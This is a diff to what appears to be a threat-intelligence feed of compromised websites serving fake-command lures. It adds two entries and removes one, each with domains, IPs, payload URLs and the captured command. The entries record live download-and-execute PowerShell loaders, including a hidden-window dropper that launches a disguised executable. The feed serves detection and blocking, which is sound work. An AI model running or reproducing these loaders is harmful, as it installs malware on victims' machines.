@@ -1,5 +1,45 @@
 [
   {
+    "UrlDomain": "www.lapetitebarque.fr",
+    "DeliveryUrl": [
+      "sentrydb.org",
+      "pillingthat.com"
+    ],
+    "PayloadUrl": [
+      "https://pillingthat.com/WfodrrIBwI"
+    ],
+    "IP": [
+      "87.98.154.146"
+    ],
+    "Related": [],
+    "Payload": "powershell -nop -c \"$f=$env:TEMP+'\\pintk.ps1';curl.exe -sk -o $f 'https://pillingthat[.]com/WfodrrIBwI';powershell -ep bypass -File $f\"",
+    "ResolvedDownloadUrl": [
+      "https://pillingthat.com/WfodrrIBwI"
+    ],
+    "ReportId": "cmwl9b54l1i4f0omls40cjhgn",
+    "ScannedAt": "2026-11-17T22:21:10.789000+00:00"
+  },
+  {
+    "UrlDomain": "drugsrehabal.com",
+    "DeliveryUrl": [],
+    "PayloadUrl": [],
+    "IP": [
+      "208.109.175.50"
+    ],
+    "Related": [
+      {
+        "Value": "gitlab.com",
+        "Type": "payload download"
+      }
+    ],
+    "Payload": "IRM gitlab[.]com/dsy648ajd6ff/01a1e287-8de7-700c-802a-969604d519c9/-/raw/main/01a1e287-8de7-700c-802a-9696051416d5 | IEX",
+    "ResolvedDownloadUrl": [
+      "https://gitlab.com/dsy648ajd6ff/01a1e287-8de7-700c-802a-969604d519c9/-/raw/main/01a1e287-8de7-700c-802a-9696051416d5"
+    ],
+    "ReportId": "cmwl8i3n01i3d0oml2g6jz12k",
+    "ScannedAt": "2026-11-17T21:58:35.810000+00:00"
+  },
+  {
     "UrlDomain": "bowblade.net",
     "DeliveryUrl": [
       "j7tracker.gb.net"
@@ -1518,24 +1558,5 @@
     ],
     "ReportId": "cmwjuij2u191f0oml5k180wgd",
     "ScannedAt": "2026-11-16T22:39:15.023000+00:00"
-  },
-  {
-    "UrlDomain": "citizenfirstnewsindia.com",
-    "DeliveryUrl": [
-      "fbifr.com"
-    ],
-    "PayloadUrl": [
-      "https://fbifr.com/eoN"
-    ],
-    "IP": [
-      "77.37.53.193"
-    ],
-    "Related": [],
-    "Payload": "$url = \"https://fbifr[.]com/eoN\";\n$filename = \"Boost Note.exe\";\n$path = $env:TEMP;\n$archive = Join-Path $path \"zN3HyHJT.zip\";\n$filepath = Join-Path $path $filename;\n$signature = @\"\nusing System;\nusing System.Runtime.InteropServices;\npublic class Win32 {\n\t[DllImport(\"kernel32.dll\")]\n\tpublic static extern IntPtr GetConsoleWindow();\n\t[DllImport(\"user32.dll\")]\n\tpublic static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);\n}\n\"@;\nAdd-Type $signature;\n$hwnd = [Win32]::GetConsoleWindow();\nif($hwnd -ne [IntPtr]::Zero)\n{\n\t[Win32]::ShowWindow($hwnd, 0);\n}\nNew-Item -Path $path -ItemType Directory -Force;\ncurl $url -o $archive;\nExpand-Archive -Path $archive -DestinationPath $path -Force;\nRemove-Item $archive -Force;\nStart-Process $filepath;\nexit",
-    "ResolvedDownloadUrl": [
-      "https://fbifr.com/eoN"
-    ],
-    "ReportId": "cmwjtkxy018zw0omloccp4asm",
-    "ScannedAt": "2026-11-16T22:13:07.976000+00:00"
   }
 ]
